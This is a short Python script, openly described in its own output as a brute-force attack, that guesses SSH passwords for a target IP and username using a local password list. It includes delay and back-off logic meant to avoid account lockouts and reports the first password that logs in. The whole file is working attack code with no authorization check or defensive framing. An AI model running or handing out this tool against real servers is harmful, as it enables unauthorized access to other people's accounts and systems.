import paramiko
import time
import sys
from pathlib import Path

def load_passwords(file_path):
    path = Path(file_path)
    if not path.is_file():
        print(f"[ERROR] Password file not found: {file_path}")
        sys.exit(1)
    with open(path, 'r', encoding='utf-8') as f:
        pwds = [line.strip() for line in f if line.strip()]
    print(f"[INFO] Loaded {len(pwds)} passwords from '{file_path}'.")
    return pwds

def ssh_bruteforce(target_ip, username, password_file, delay=10):
    passwords = load_passwords(password_file)
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    print(f"Starting brute-force attack on {target_ip} with user '{username}'...\n")

    for idx, pwd in enumerate(passwords, 1):
        try:
            print(f"Attempt {idx}/{len(passwords)}: Trying password '{pwd}'")
            ssh.connect(target_ip, username=username, password=pwd, timeout=5)
            print(f"\n[SUCCESS] Login succeeded with password: '{pwd}'")
            ssh.close()
            return True

        except paramiko.AuthenticationException:
            print("[FAILURE] Authentication failed.")

        except paramiko.SSHException as e:
            print(f"[WARNING] SSH error: {e}. Retrying after longer delay...")
            time.sleep(delay * 3)
            continue

        except ConnectionResetError as e:
            print(f"[WARNING] Connection reset by peer: {e}. Retrying after longer delay...")
            time.sleep(delay * 5)
            continue

        except Exception as e:
            print(f"[ERROR] Connection failed: {e}")
            break

        time.sleep(delay)

    print("\n[INFO] Brute-force attack finished. No valid password found.")
    return False

if __name__ == "__main__":
    target_ip = input("Enter target IP address: ").strip()
    username = input("Enter target username: ").strip()

    # Fix: load password file from script's directory
    script_dir = Path(__file__).parent
    password_file = script_dir / "passwords.txt"

    delay_seconds = 10  # delay to avoid lockouts

    ssh_bruteforce(target_ip, username, password_file, delay_seconds)
